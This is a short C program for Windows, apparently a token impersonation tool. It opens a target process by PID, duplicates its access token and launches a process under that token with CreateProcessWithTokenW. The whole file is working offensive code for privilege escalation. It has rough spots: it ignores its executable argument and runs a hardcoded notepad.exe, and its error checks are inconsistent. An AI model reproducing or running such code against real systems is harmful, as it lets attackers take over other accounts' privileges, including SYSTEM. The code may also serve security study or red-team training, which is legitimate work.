//Compile: 
//cl TokenImpersonation.c 
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Advapi32.lib")

VOID GetLastErrorAsString(DWORD error_code) {
    LPTSTR lpMsgBuf = NULL;
    DWORD bufLen = FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error_code,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0,
        NULL
    );

    if (bufLen == 0) {
        return NULL;
    }

    printf("%s\n", lpMsgBuf);
}

int wmain(int argc, wchar_t* argv[]){
    printf("Hello World\n");
    if(argc != 3){
        printf("Usage: ./ImpersonateToken.exe [PID] [exe]\n");
        return 1;
    }


    DWORD PID_TO_IMPERSONATE = _wtoi(argv[1]);
    printf("%ld\n", PID_TO_IMPERSONATE);
    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID_TO_IMPERSONATE);
    if(processHandle == NULL){
        printf("error OpenProcess\n");
        return 1;
    }

    HANDLE tokenHandle;
    OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
    if(tokenHandle == NULL){
        printf("error tokenHandle\n");
        return 1;
    }

    HANDLE duplicateTokenHandle;
    if(0 == DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &duplicateTokenHandle)){
        printf("error DuplicateTokenEx %lu\n", GetLastError());
        return 1;
    }
    STARTUPINFO startupInfo = {0};
    PROCESS_INFORMATION processInformation = {0};
    startupInfo.cb = sizeof(STARTUPINFO);

    printf("Running %S\n", argv[2]);
    wchar_t cmdline[] = L"C:\\Windows\\System32\\notepad.exe";
    if(!CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0  , NULL, NULL, &startupInfo, &processInformation)){
        printf("error CreateProcessWithTokenW\n");
        GetLastErrorAsString(GetLastError());
        return 1;
    }
    return 0;
}
